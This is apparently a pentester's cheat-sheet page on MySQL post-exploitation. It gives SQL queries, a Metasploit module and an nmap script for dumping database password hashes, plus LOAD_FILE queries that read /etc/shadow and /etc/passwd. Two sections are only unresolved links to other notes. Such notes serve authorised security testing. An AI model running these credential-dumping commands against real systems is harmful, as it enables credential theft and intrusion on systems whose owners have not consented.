# MySQL

## 01 - DBMS Hashdump

### 1.1 - Manual

- Method 1:

```
MySQL [(none)]> SELECT user,authentication_string from mysql.user;

MySQL [(none)]> SELECT user,password from mysql.user;
```

- Method 2:

```
MySQL [(none)]> use mysql;

MySQL [(mysql)]> SELECT user,authentication_string from user;

MySQL [(mysql)]> SELECT user,password from user;
```

### 1.2 - Metasploit

```
msf > use auxiliary/scanner/mysql/mysql_hashdump

msf auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as

msf auxiliary(scanner/mysql/mysql_hashdump) > run mysql://<username>:<password>@<IP>
```

### 1.3 - Network Mapper

```
$ nmap -p 3306 --script mysql-dump-hashes --script-args "username='<username>',password='<password>'" <IP>
```

## 02 - Enumerate Instance

![[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Cross Platform/Databases/SQL/MySQL/Scanners/Metasploit#^7426c9]]

## 03 - Operating System Hashdump

### 3.1 - Manual

```
MySQL [(none)]> SELECT LOAD_FILE('/etc/shadow');

MySQL [(none)]> SELECT LOAD_FILE('/etc/passwd');
```

### 3.2 - Metasploit

![[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Cross Platform/Databases/SQL/MySQL/Scanners/Metasploit#^080e98]]
